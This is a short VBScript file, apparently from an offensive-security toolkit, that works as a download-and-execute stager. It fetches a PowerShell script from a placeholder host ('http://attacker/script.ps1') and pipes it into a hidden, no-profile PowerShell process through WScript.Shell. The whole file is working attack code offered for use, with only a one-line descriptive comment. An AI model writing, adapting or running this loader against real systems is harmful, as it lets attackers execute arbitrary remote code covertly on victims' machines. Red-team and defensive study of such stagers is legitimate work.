'
' Example of downloading a binary file from the URL, saving it to the
' local filesystem and then launching.
'
' Mariusz B. / mgeeky, <mb@binary-offensive.com>
' (https://github.com/mgeeky)
'

scriptURL = "http://attacker/script.ps1"
launcher = "powershell -nop -w hid -Command -"

Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.Open "GET", scriptURL, False
xhr.Send

Function bin2a(Binary)
    Dim I,S
    For I = 1 to LenB(Binary)
        S = S & Chr(AscB(MidB(Binary,I,1)))
    Next
    bin2a = S
End Function

If xhr.Status = 200 Then
    With CreateObject("WScript.Shell")
        With .Exec(launcher)
            .StdIn.WriteLine bin2a(xhr.responseBody)
            .StdIn.WriteBlankLines 1
            .Terminate
        End With
    End With
End If

Set xhr = Nothing